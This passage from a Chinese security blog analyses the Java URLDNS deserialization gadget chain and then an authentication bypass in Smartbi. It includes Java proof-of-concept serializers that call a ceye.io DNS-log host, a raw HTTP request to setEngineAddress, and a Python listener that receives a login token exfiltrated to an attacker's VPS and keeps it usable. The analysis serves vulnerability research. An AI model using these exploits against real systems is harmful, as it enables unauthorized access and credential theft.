class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先认识一下<code>HashMap</code>类：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230318225013729.png" alt="image-20230318225013729"></p><p>也就是说，这个类中，存储的是多个键值对，并会根据键的哈希值存储数据。</p><p>使用方式：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230318225227977.png" alt="image-20230318225227977"></p><p>常见的几个方法</p><ol><li>put()方法，用于添加键值对</li><li>get()方法，用于获取某个键对应的值</li><li>clear()方法，用于删除所有键值对</li><li>size()方法，计算所有的元素数量</li></ol><p>通过上述方法，我们可以简单了解到整个类的具体作用。但是这里的<code>Payload</code>主要的入口还是在它的<code>readobject()</code>方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@java</span>.io.Serial</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read loadFactor (ignore threshold)</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">        <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line"></span><br><span class="line">        lf = Math.min(Math.max(<span class="number">0.25f</span>, lf), <span class="number">4.0f</span>);</span><br><span class="line">        HashMap.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line"></span><br><span class="line">        reinitialize();</span><br><span class="line"></span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// use defaults</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">double</span> <span class="variable">dc</span> <span class="operator">=</span> Math.ceil(mappings / (<span class="type">double</span>)lf);</span><br><span class="line">            <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((dc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (dc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="type">int</span>)dc));</span><br><span class="line">            <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">            <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">            SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里还是稍微简单的看一下代码，首先是实例化了一个类，<code>ObjectInputStream.GetField</code>，然后调用的是类中的<code>get()</code>方法。</p><p>方法可以获取<code>loadFactor</code>字段的值，存放入<code>Float</code>类型的变量<code>lf</code>中。</p><p>在判断<code>lf</code>没有问题后，还是调用<code>Hashmap</code>类中的方法，这一段不作用，其实就是看了一下Hashmap生成的哈希表，然后来决定怎么操作。</p><p>重点是从那个For循环开始的一段，可以看到最后一段调用了<code>putVal()</code>方法，也就是将元素添加到Hashmap集合中。</p><p>这里的关键是调用了hash()函数，跟进一下：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230402204917867.png" alt="image-20230402204917867"></p><p>然后这里其实只有一个return，所以重点应该是在hashCode()上面，跟进一下key的hashcode方法。</p><p>因为在这里：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230402210053895.png" alt="image-20230402210053895"></p><p>可以看到，Hashmap的类——ht调用了put方法，将URL类的对象u作为key存入了Hashmap集合。</p><p>因此，这里其实就是找的URL类中的<code>hashcode()</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230402210305930.png" alt="image-20230402210305930"></p><p>可以看到这里，判断如果hashcode不是-1，就返回。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230402210338595.png" alt="image-20230402210338595"></p><p>因为在URLDNS.java中设置了，所以这里不会进入。</p><p>然后就是最关键的地方，这里调用了<code>handler.hashcode()</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230402210505689.png" alt="image-20230402210505689"></p><p>可以看到，这里调用了一个叫做<code>getHostAddress()</code>的方法，这个方法的作用就是说去指定主机的ip地址。</p><p>我们都知道，我们之所以可以通过URL访问一个网站，就是因为我们会通过DNS服务器来进行DNS查询，来获取对应URL的ip地址，因此才能访问。因此，当这里开始尝试获取指定主机的ip地址的时候，就会直接触发DNS查询的效果。</p><p>也就是说调用链：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hashmap.readObject()-&gt;hash()</span><br><span class="line">hash()-&gt;key.hashCode()</span><br><span class="line">Key.hashCode()=URL.hashCode()-&gt;getHostAddress()</span><br></pre></td></tr></table></figure><p>这里已经明确了<code>gadget</code>，然后我们尝试自己写一个<code>poc</code>：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">strings</span> <span class="operator">=</span> <span class="string">&quot;http://xxxx.ceye.io/&quot;</span>;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(strings);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(u,-<span class="number">1</span>);</span><br><span class="line">        hash.put(u,<span class="number">123</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./POC.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(file);</span><br><span class="line">            out.writeObject(hash);</span><br><span class="line">            out.close();</span><br><span class="line">            file.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后还是用之前写的测试程序来测试一下，发现我们的DNSlog网站可以收到DNS查询记录，说明成功。</p><p>利用链还是完全一样的，整体思路就是去调用<code>java.net.URL</code>类里面的<code>hashCode()</code>里面的<code>getHostAddress()</code>.</p><p>但是这个POC还是有一个问题。</p><p>因为这里在<code>hash.put()</code>部分调用了<code>Hashmap</code>中的<code>put()</code>函数：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230402234603512.png" alt="image-20230402234603512"></p><p>这里同样会调用一次<code>putVal(hash(key))</code>，因为这里的key是URL类，如果我们首先设置<code>hashcode</code>为<code>-1</code>，同样会触发一次DNS查询。</p><p>如果我们不提前设置，那么可以发现，默认的hashCode值是-1，那么也会触发这次DNS查询。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230402235728061.png" alt="image-20230402235728061"></p><p>因此，我们可以这样修改POC:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">strings</span> <span class="operator">=</span> <span class="string">&quot;http://rzln5k.ceye.io/&quot;</span>;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(strings);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(u,<span class="number">1</span>); <span class="comment">//用于修改hashcode，跳过DNS查询</span></span><br><span class="line">        hash.put(u,<span class="number">123</span>);</span><br><span class="line">        field.set(u,-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./POC.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(file);</span><br><span class="line">            out.writeObject(hash);</span><br><span class="line">            out.close();</span><br><span class="line">            file.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样就是一个完整的poc了。</p><p>而相对的，ysoserial里面的POC不是走的这种方式，他是一开始的时候，就把<code>URLStreamHandler</code>类下面设置了一个子类，<code>SilentURLStreamHandler</code>。</p><p>然后将handler传递给了URL构造函数。<br><code>URL u = new URL(null, url, handler);</code></p><p>在URL构造函数中，如果handler存在，则执行<br><code>this.handler = handler;</code></p><p>因此第一次<code>HashMap.put</code>时，会进入<code>handler.hashCode(this)</code>，<strong>注意这里的handler是SilentURLStreamHandler的对象</strong>。</p><p>当进行到<code>ht.put()</code>，这一步的时候，就是调用的<code>SilentURLStreamHandler</code>中的<code>getHostAddress()</code>函数，也就是直接返回了一个null，不会产生dns查询。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230403003128950.png" alt="image-20230403003128950"></p><p>而后面，到反序列化的时候，可以产生DNS查询，是因为handler属性被设置为了transient，被transient 修饰的变量无法被序列化，所以最终反序列化读取出来的 transient依旧是其初始值，也就是URLStreamHandler。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Smartbi系列漏洞详解</title>
      <link href="/2023/09/21/Smartbi%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A/"/>
      <url>/2023/09/21/Smartbi%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A/</url>
      
        <content type="html"><![CDATA[<h1 id="Smartbi系列漏洞详解："><a href="#Smartbi系列漏洞详解：" class="headerlink" title="Smartbi系列漏洞详解："></a>Smartbi系列漏洞详解：</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>近期爆出的三个Smartbi产品的漏洞，其主要的漏洞产生原因都是因为没有对用户的访问做限制，或者是攻击者能够通过某些逻辑上的漏洞，绕过限制，对一些敏感的类，或是方法进行访问。</p><p>以下将对三个Smartbi中的漏洞进行分析，会首先给出POC，再根据POC给出分析过程和可利用的EXP。</p><h2 id="1-x2F-api-x2F-monitor-x2F-setEngineAddress-权限绕过漏洞"><a href="#1-x2F-api-x2F-monitor-x2F-setEngineAddress-权限绕过漏洞" class="headerlink" title="1. &#x2F;api&#x2F;monitor&#x2F;setEngineAddress 权限绕过漏洞"></a>1. &#x2F;api&#x2F;monitor&#x2F;setEngineAddress 权限绕过漏洞</h2><h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>首先给出POC:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /smartbi/smartbix/api/monitor/setEngineAddress HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:18080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: FQConfigLogined=; FQPassword=; JSESSIONID=BEF47407273964E120DDB8C848EE877C</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>向以上接口，以POST方式发送任意值，能够获得以下返回包，即可证明漏洞存在（<strong>需要注意的是，Content-Type需要设为text&#x2F;plain，而非application&#x2F;x-www-form-urlencoded</strong>）：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828190840450.png" alt="image-20230828190840450"></p><p>该漏洞的主要成因，是Smartbi的设计者没有对用户访问以下路径做限制：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828191238559.png" alt="image-20230828191238559"></p><p>接下来开始分析。</p><p>首先，在<code>smartbix.datamining.service.MonitorService.class</code>类中，可以看到对于上述路径的具体操控：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828191629529.png" alt="image-20230828191629529"></p><p>当通过POST方式，传入任何参数的时候，在处理中会调用<code>this.systemConfigService.updateSystemConfig()</code>函数，将我们传入的任意参数作为<code>engineAddress</code>传入。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828191949194.png" alt="image-20230828191949194"></p><p>随后，该函数会将我们传入的参数存储后，更新为整个系统中的引擎地址(engineAddress)。</p><p>当我们访问engineInfo接口的时候，即可看到更新后的引擎地址，此时engineAddress已经被成功的更新为成了123</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828192451101.png" alt="image-20230828192451101"></p><p>随后，我们访问token接口，即可完成对于该漏洞的利用。</p><p>具体可以在<code>MonitorService.class</code>类中找到对该接口的处理：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FunctionPermission(&#123;&quot;NOT_LOGIN_REQUIRED&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getToken</span><span class="params">(<span class="meta">@RequestBody</span> String type)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> <span class="built_in">this</span>.catalogService.getToken(<span class="number">10800000L</span>);</span><br><span class="line">        <span class="keyword">if</span> (StringUtil.isNullOrEmpty(token)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> SmartbiXException.create(CommonErrorCode.NULL_POINTER_ERROR).setDetail(<span class="string">&quot;token is null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="string">&quot;SERVICE_NOT_STARTED&quot;</span>.equals(token)) &#123;</span><br><span class="line">            Map&lt;String, String&gt; result = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            result.put(<span class="string">&quot;token&quot;</span>, token);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;experiment&quot;</span>.equals(type)) &#123;</span><br><span class="line">                EngineApi.postJsonEngine(EngineUrl.ENGINE_TOKEN.name(), result, Map.class, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;service&quot;</span>.equals(type)) &#123;</span><br><span class="line">                EngineApi.postJsonService(ServiceUrl.SERVICE_TOKEN.name(), result, Map.class, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;EngineApi.address(<span class="string">&quot;service-address&quot;</span>)&#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再这部分代码中，首先在开头注明了，<code>/token</code>路径，无需登录即可访问，这是漏洞能够触发的基础。</p><p>当进入程序块后，会通过</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> <span class="built_in">this</span>.catalogService.getToken(<span class="number">10800000L</span>);</span><br></pre></td></tr></table></figure><p>进行token获取。这里看一下调用链条中的一个可能会坑的判定条件：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828193941722.png" alt="image-20230828193941722"></p><p>这个a用于标识框架是否运行，如果在本地复现环境的时候，没有启动用户界面框架，会导致漏洞利用失败，此时，将a设置为true即可。</p><p>当通过上述方法获取到了token了之后，随即向下走：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828194715596.png" alt="image-20230828194715596"></p><p>我们需要调用的函数是在if中的<code>EngineApi.postJsonEngine()</code>，为了进入if，我们POST传入参数的时候，必须传入一个<code>experiment</code>。</p><p>随后查看一下<code>postJsonEngine()</code>方法的具体调用逻辑：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828195106265.png" alt="image-20230828195106265"></p><p>可以看到这里，postJsonEngine方法首先会通过<code>EngineUrl.getUrl()</code>函数，获取一个url，随后通过<code>HttpKit.postJson()</code>函数，将token作为data的值，将它post过去。</p><p>这里详细看getUrl的调用链：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828200000844.png" alt="image-20230828200000844"></p><p>可以看到这里，获取了SystemConfigService中，键为<code>ENGINE_ADDRESS</code>的值。</p><p>这里也就是我们之前设置的EngineAddress的值，将其作为url返回。</p><p>接下来，当程序执行到<code>HttpKit.postJson()</code> 的时候，便会将token通过POST的方式，以JSON的格式发送到我们设置的url地址上。</p><p>因此我们只需发送以下request请求包，nc监听对应的端口，即可在个人vps上获取到token:</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828201055875.png" alt="image-20230828201055875"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828201017512.png" alt="image-20230828201017512"></p><h3 id="坑点解析："><a href="#坑点解析：" class="headerlink" title="坑点解析："></a>坑点解析：</h3><p>理论上来说，只要我们带着这个token的值去访问loginByToken路径，就能够获取到可以登录的session值。</p><p>但是很不幸的是，这里的token是<strong>不能使用</strong>的，主要的问题出在这里：</p><p>当smartbi向我们的vps发送token的时候，POST请求最后的发送点在<code>HttpKit.class#exe()</code>方法中：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829142911810.png" alt="image-20230829142911810"></p><p>可以发现，在第一个红框中，会获取smartbi发送请求后获得的响应值<code>response</code>，因此，我们的服务器端需要给出一个返回值。</p><p>在接下来的第二个红框中，会尝试将返回的<code>response</code>中的body部分，以json格式进行值的获取。这里告诉我们，vps返回的<code>response</code>必须是以json格式类型返回。</p><p>当上述解析成功之后，继续跟入，会来到<code>EntityInsertAction.class</code>的<code>afterTransactionCompletion()</code>方法。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829144013064.png" alt="image-20230829144013064"></p><p>这里的ck，就是Smartbi发送到用户端的token值。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829144745072.png" alt="image-20230829144745072"></p><p>随后通过第二个红框中的<code>persister.getCache().afterInsert()</code>方法，将这个token存入对应的变量中，就是下面图片中的<code>this.cache.update</code>函数。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829144959607.png" alt="image-20230829144959607"></p><p>当我们对<code>loginByToken()</code>函数调用的时候，实际上就是调用这里存入的token值进行比对，如果比对成功即可登录。</p><p><strong>因此，如果我们没有在vps中返回一个json格式的任意返回值，就不会调用到afterTransactionCompletion()方法，也就不能将token值存入变量，用于对比，自然也就登录失败了。</strong></p><p>这里查看一下<code>MonitorService.class</code>类中，<code>loginByToken()</code>方法的调用链：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828201528434.png" alt="image-20230828201528434"></p><p>这里一路跟入，查看调用链：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828202045139.png" alt="image-20230828202045139"></p><p>可以发现，最后来到了<code>AbstractDAO.class</code>中的<code>load()</code>方法中。其中，第一个红框中的判断，当第一次访问的时候就是null，但是会在使用token访问后，留下缓存，如果上次访问出现问题，抛出异常，会返回一个null。</p><p>第一次访问时：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829122122303.png" alt="image-20230829122122303"></p><p>第二次访问时会查看上次的缓存，如果上次访问失败，或是出现异常，会返回一个null：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230829122002153.png" alt="image-20230829122002153"></p><p>继续调用load方法，接下来会来到：</p><p><code>DefaultLoadEventListener.class#loadFromSecondLevelCache()</code>方法。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230828203338387.png" alt="image-20230828203338387"></p><p>可以看到这里<code>ce</code>的值，是通过<code>persister.getCache().get(ck,source.getTimestamp())</code>函数获得的，这里就是在把用户传入的<code>token</code>(也就是<code>ck</code>)，与我们之前存入的<code>ck</code>值作比较。成功，<code>ce</code>的值就不会为null，也就是登录成功。</p><h3 id="正确利用漏洞的方案："><a href="#正确利用漏洞的方案：" class="headerlink" title="正确利用漏洞的方案："></a>正确利用漏洞的方案：</h3><p>经过以上分析，我们不难知道，我们需要在服务器上开启一个监听某个端口的简单服务，当接收到Smartbi发送的token值的时候，返回一个json格式的任意值的响应包，才能正常的使用token。</p><p>这里我使用Python3简单实现了一个服务：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSONHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_set_response</span>(<span class="params">self, status_code=<span class="number">200</span>, content_type=<span class="string">&#x27;application/json&#x27;</span></span>):</span><br><span class="line">        self.send_response(status_code)</span><br><span class="line">        self.send_header(<span class="string">&#x27;Content-type&#x27;</span>, content_type)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        content_length = <span class="built_in">int</span>(self.headers[<span class="string">&#x27;Content-Length&#x27;</span>])</span><br><span class="line">        post_data = self.rfile.read(content_length)</span><br><span class="line">        json_data = json.loads(post_data)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Received JSON:&quot;</span>, json_data)</span><br><span class="line">        </span><br><span class="line">        response_data = &#123;</span><br><span class="line">            <span class="string">&quot;message&quot;</span>: <span class="string">&quot;JSON received and processed successfully&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = json.dumps(response_data).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self._set_response()</span><br><span class="line">        self.wfile.write(response)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">server_class=HTTPServer, handler_class=JSONHandler, port=<span class="number">2333</span></span>):</span><br><span class="line">    server_address = (<span class="string">&#x27;&#x27;</span>, port)</span><br><span class="line">    httpd = server_class(server_address, handler_class)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Listening on port <span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line">    httpd.serve_forever()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure><p>当发送了token后，VPS上接收到：</p><p><img 